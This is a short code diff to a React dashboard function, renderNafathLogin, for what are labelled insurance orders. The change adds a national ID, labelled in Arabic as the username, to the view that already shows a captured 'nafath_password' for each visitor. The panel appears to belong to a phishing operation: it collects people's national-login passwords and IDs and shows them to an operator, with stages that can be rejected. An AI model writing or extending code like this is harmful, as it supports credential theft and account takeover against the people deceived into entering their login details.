@@ -480,7 +480,9 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
   const latestEvent = events.at(-1);
+  const payloadNatId = (latestEvent?.payload as any)?.national_id;
   const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
+  const nationalId = order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId || null;
   const password = order.nafath_password || payloadPassword || null;
 
   return (
@@ -494,8 +496,11 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
           </div>
         </div>
       ))}
-      {password ? (
-        <InfoItem label="كلمة المرور" value={password} />
+      {(nationalId || password) ? (
+        <div className="grid grid-cols-1 gap-1.5">
+          <InfoItem label="اسم المستخدم (الهوية)" value={nationalId || "—"} />
+          <InfoItem label="كلمة المرور" value={password || "—"} />
+        </div>
       ) : (
         <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
       )}
